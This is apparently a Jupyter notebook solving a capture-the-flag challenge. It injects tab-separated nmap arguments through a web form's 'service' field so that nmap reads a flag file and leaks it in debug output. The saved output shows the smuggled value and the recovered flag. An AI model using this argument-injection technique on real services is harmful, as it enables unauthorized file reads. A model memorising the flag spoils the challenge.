{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e6305fa5",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "service=0.0.0.0:1337%09-d9%09-iL%09../flag-????????????????????????????????????%09-oN%09-\n",
      "Fetchfile found /usr/bin/../share/nmap/nmap-services\n",
      "Fetchfile found /usr/bin/../share/nmap/nmap.xsl\n",
      "# Nmap 7.92 scan initiated Sat Aug 26 08:37:13 2023 as: nmap -p 1337 -d9 -iL ../flag-cd67e3aee0945e4040858a0530df2219.txt -oN - 0.0.0.0\n",
      "--------------- Timing report ---------------\n",
      "  hostgroups: min 1, max 100000\n",
      "  rtt-timeouts: init 1000, min 100, max 10000\n",
      "  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000\n",
      "  parallelism: min 0, max 0\n",
      "  max-retries: 10, host-timeout: 0\n",
      "  min-rate: 0, max-rate: 0\n",
      "---------------------------------------------\n",
      "Error resolving SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}: Name does not resolve\n",
      "Failed to resolve \"SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}\".\n",
      "Read from /usr/bin/../share/nmap: nmap-services.\n",
      "WARNING: No targets were specified, so 0 hosts scanned.\n",
      "# Nmap done at Sat Aug 26 08:37:13 2023 -- 0 IP addresses (0 hosts up) scanned in 0.19 seconds\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "headers = {\n",
    "    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n",
    "    'Accept-Language': 'en-US,en;q=0.9',\n",
    "    'Cache-Control': 'max-age=0',\n",
    "    'Connection': 'keep-alive',\n",
    "    'Content-Type': 'application/x-www-form-urlencoded',\n",
    "    'Origin': 'http://35.231.135.130:32627',\n",
    "    'Referer': 'http://35.231.135.130:32627/',\n",
    "    'Upgrade-Insecure-Requests': '1',\n",
    "    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',\n",
    "}\n",
    "\n",
    "\n",
    "url = 'http://35.231.135.130:30963'\n",
    "def send(command):\n",
    "    data = f'service={command}'\n",
    "    print(data)\n",
    "\n",
    "    response = requests.post(url, headers=headers, data=data, verify=False)\n",
    "    text = response.content.decode()\n",
    "\n",
    "    return text.split('<code>')[1].split('</code>')[0].strip()\n",
    "\n",
    "\n",
    "injection = 'nmap -d9 -iL ../flag-???????????????????????????????????? -oN -'\n",
    "injection = injection.replace('nmap ', '').replace(' ', '%09')\n",
    "command = f'0.0.0.0:1337%09{injection}'\n",
    "print(send(command))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4476d232",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "py310",
   "language": "python",
   "name": "py310"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
